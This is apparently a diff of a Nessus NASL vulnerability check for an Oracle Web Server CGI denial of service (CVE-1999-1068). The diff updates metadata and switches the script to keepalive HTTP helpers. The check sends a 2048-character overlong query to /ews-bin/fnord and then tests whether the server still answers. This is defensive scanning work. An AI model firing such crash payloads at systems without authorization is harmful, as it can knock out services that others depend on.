@@ -7,8 +7,8 @@
 if(description)
 {
  script_id(10171);
- script_version ("$Revision: 1.16 $");
- script_cve_id("CAN-1999-1068");
+ script_version ("$Revision: 1.22 $");
+ script_cve_id("CVE-1999-1068");
 
  name["english"] = "Oracle Web Server denial of Service";
  name["francais"] = "Déni de service contre le serveur web d'Oracle";
@@ -26,7 +26,7 @@ your customers to access your web site.
 
 Solution : remove this CGI.
 
-Risk factor : Serious";
+Risk factor : High";
 
  desc["francais"] = "
 Il s'est avéré possible de faire planter
@@ -55,9 +55,8 @@ Facteur de risque : Sérieux";
  
  script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
 		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
- family["english"] = "Denial of Service";
- family["francais"] = "Déni de service";
- script_family(english:family["english"], francais:family["francais"]);
+ family["english"] = "Databases";
+ script_family(english:family["english"]);
  script_dependencie("find_service.nes", "no404.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
@@ -67,12 +66,15 @@ Facteur de risque : Sérieux";
 # The script code starts here
 #
 
+include("http_func.inc");
+include("http_keepalive.inc");
+port = get_http_port(default:80);
 
-port = is_cgi_installed("/ews-bin/fnord");
-if(port)
+res = is_cgi_installed_ka(item:"/ews-bin/fnord", port:port);
+if(res)
 {
   request = string("/ews-bin/fnord?foo=", crap(2048));
-  is_cgi_installed(request);
+  is_cgi_installed_ka(item:request, port:port);
   sleep(5);
   soc = open_sock_tcp(port);
   if(!soc)security_hole(port);
